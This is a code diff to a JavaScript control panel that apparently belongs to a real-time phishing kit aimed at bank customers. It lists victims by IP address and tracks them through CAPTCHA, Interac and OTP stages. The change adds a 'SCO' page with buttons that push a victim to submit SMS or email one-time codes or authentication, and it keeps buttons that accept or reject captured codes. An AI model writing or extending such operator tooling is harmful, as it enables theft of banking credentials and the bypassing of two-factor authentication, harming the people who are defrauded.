@@ -53,7 +53,7 @@ function updateConnectionsTable(users) {
       color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
     }
 
-    if (details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
+    if (details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
       userDiv.innerHTML = `
         
           <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
@@ -118,8 +118,8 @@ function updateConnectionsTable(users) {
               <h5 class="card-title">${details.page || ''}</h5>
               <p class="card-text">${details.stage || ''}</p>
               <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
-              <a href="#" class="m-1 btn btn-success send-otp-good-button">Good OTP</a>
-              <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad OTP</a>
+              <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
+              <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>
             </div>
           </div>
     
@@ -135,6 +135,42 @@ function updateConnectionsTable(users) {
             socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
           });          
 
+    } else if(details.page == 'SCO'){
+      userDiv.innerHTML = `
+        
+      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
+      <div class="card">
+        <div class="card-header">
+          <span class="badge bg-${color}">
+            ${ipAddress}
+          </span>
+        </div>
+        <div class="card-body">
+          <h5 class="card-title">${details.page || ''}</h5>
+          <p class="card-text">${details.stage || ''}</p>
+          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
+          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
+          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
+          </div>
+      </div>
+
+      `;
+
+      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
+      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
+      let sendAuthButton = userDiv.querySelector('.send-auth-button');
+      sendOtpSmsButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
+      });
+
+      sendOtpEmailButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
+      });     
+      
+      sendAuthButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
+      });    
     } else {
       userDiv.innerHTML = `
        
